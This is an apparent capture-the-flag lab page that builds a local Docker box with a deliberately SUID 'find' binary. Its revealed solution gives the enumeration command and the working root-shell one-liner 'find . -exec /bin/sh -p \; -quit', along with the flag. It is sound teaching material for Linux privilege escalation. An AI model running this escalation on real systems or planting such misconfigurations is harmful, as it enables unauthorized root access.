## Objective

You have a shell as the unprivileged user `student`. Somewhere on the box is a
root-owned SUID binary that shouldn't be one. Find it, abuse it to become root,
and read `/root/flag.txt`.

## Environment setup

This lab runs entirely on your machine — no account, no remote infrastructure.
Build the box from this Dockerfile:

```dockerfile title="Dockerfile"
FROM debian:stable-slim
RUN useradd -m student && echo 'student:student' | chpasswd
RUN apt-get update && apt-get install -y vim-tiny && rm -rf /var/lib/apt/lists/*
RUN echo 'redsec{suid_is_a_privilege}' > /root/flag.txt && chmod 600 /root/flag.txt
# The intentional misconfiguration:
RUN chmod u+s /usr/bin/find
USER student
WORKDIR /home/student
CMD ["/bin/bash"]
```

```bash title="Build and enter the box"
docker build -t redsec/suid-lab .
docker run --rm -it redsec/suid-lab
```

You'll land as `student`. Everything below happens inside that shell.

<Callout type="warning" title="Authorized practice only">
  This is a throwaway container you built yourself. Apply these techniques only
  to systems you own or are explicitly authorized to test.
</Callout>

## Your task

1. Enumerate SUID binaries on the box.
2. Identify the one that doesn't belong.
3. Abuse it to spawn a root shell.
4. Read the flag.

## Hints

<details>
  <summary>Hint 1 — where do I start?</summary>

  Recall the enumeration command from the **SUID binary enumeration** lesson.
  You want every file with the SUID bit set:

  ```bash
  find / -perm -4000 2>/dev/null
  ```
</details>

<details>
  <summary>Hint 2 — which binary is wrong?</summary>

  Most of the results are normal (`passwd`, `mount`, …). One of them can spawn a
  shell and has no business being SUID. Check the suspicious one against
  <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a>.
</details>

<details>
  <summary>Hint 3 — how do I keep root?</summary>

  When you spawn the shell, pass <code>-p</code> so it doesn't drop the elevated
  privileges back to your real UID.
</details>

---

## Solution

<details>
  <summary>Reveal the full solution</summary>

  Enumerate SUID binaries:

  ```bash
  find / -perm -4000 2>/dev/null
  ```

  `/usr/bin/find` shows up — that's the odd one out. Per GTFOBins, a SUID `find`
  can run commands via `-exec`. Spawn a privileged shell:

  ```bash
  find . -exec /bin/sh -p \; -quit
  ```

  Confirm you're root and grab the flag:

  ```bash
  id
  cat /root/flag.txt
  # redsec{suid_is_a_privilege}
  ```

  **Why it worked:** the SUID bit made `find` run as its owner (`root`). Its
  `-exec` action then launched a shell that inherited root, and `-p` kept the
  elevated privileges instead of dropping them.
</details>
